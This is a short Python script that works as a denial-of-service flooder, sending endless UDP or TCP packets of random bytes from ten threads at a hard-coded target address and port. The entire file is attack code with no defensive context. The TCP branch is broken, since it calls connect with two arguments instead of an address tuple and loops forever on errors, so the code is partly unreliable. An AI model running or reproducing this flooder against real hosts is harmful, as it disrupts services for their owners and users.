#!/usr/bin/env python3

import random
import socket
import threading
from locale import str


# ip = str("")
# port = int(80)/

ip = "10.0.0.6"
port = 5000
choice = "UDP"
times = 1
threads = 10


def floodUDP():
    data = random._urandom(1024)
    j = True
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            address = (ip, port)
            for x in range(times):
                s.sendto(data, address)
                if j == True:
                    print("Sent packets.")
                    j = False
        except Exception as e:
            print(e)
            break


def floodTCP():
    data = random._urandom(16)
    i = random.choice(("[*]", "[!]", "[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(ip, port)
            for x in range(times):
                s.send(data)
            print(i + "packets sent")
        except:
            print("Error")


for y in range(threads):
    if(choice == "UDP"):
        th = threading.Thread(target=floodUDP)
        th.start()
    elif(choice == "TCP"):
        th = threading.Thread(target=floodTCP)
        th.start()
    else:
        print("Wrong input given")


"""
if(j == True):
print(i + " packets sent.")
j = False

"""
